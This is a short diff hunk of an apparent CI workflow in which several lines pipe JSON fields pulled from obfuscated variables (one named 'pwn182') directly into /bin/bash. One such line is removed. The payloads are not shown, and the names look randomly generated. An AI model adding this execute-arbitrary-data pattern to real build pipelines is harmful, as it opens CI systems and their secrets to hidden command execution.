@@ -26,7 +26,6 @@ jobs:
           echo $fwk20 | jq -r .hv174 | /bin/bash
           printf '%s' "$lr8" | jq -r .q95757 | /bin/bash
           echo $d573 | jq -r .h70 | /bin/bash
-          echo $n19 | jq -r .e627 | /bin/bash
           printf '%s' "$wa8557" | jq -r .ucear01 | /bin/bash
           echo $pwn182 | jq -r .fs30744 | /bin/bash
           printf '%s' "$yflt88604" | jq -r .dindr253 | /bin/bash
